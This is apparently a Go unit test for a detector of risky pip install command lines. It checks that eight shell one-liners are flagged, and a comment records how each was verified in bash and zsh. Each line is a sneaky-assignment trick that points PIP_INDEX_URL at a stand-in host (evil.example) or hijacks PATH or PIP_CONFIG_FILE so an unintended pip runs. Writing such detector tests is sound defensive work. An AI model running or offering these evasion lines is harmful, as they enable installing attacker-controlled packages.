package installread

import "testing"

// Re-review of READER-EXPANSION-ENV-1 (reader-env 45dba3a): assignments in the line's shell the class misses. Each was
// checked in a real shell (r13/): bash 3.2 and 5.2 assign through a redirection's word; zsh 5.9 assigns with ::= and
// (P); an arithmetic assignment sets PATH=1, and bash and zsh then run ./1/pip — no export needed for PATH. Adopted in
// round 27 as it was.
func TestReview14MissedAssigns(t *testing.T) {
	const u = "https://evil.example/simple"
	for _, line := range []string{
		`set -a; echo x > /dev/null${PIP_INDEX_URL:=` + u + `}; pip install zz-pkg`,
		`set -a; : ${PIP_INDEX_URL::=` + u + `}; pip install zz-pkg`,
		`set -a; r=PIP_INDEX_URL; : ${(P)r::=` + u + `}; pip install zz-pkg`,
		`set -a; r=PIP_INDEX_URL; : ${(P)r:=` + u + `}; pip install zz-pkg`,
		`: $((PATH=1)); pip install zz-pkg`,
		`(( PATH = 1 )); pip install zz-pkg`,
		`let PATH=1; pip install zz-pkg`,
		`set -a; : $((PIP_CONFIG_FILE=1)); pip install zz-pkg`,
	} {
		tg, un, _, subst := ParseLine(line)
		ex := HookExtra(line, tg, un, subst)
		if len(un)+len(ex) == 0 {
			t.Errorf("%q: silent", line)
		}
	}
}
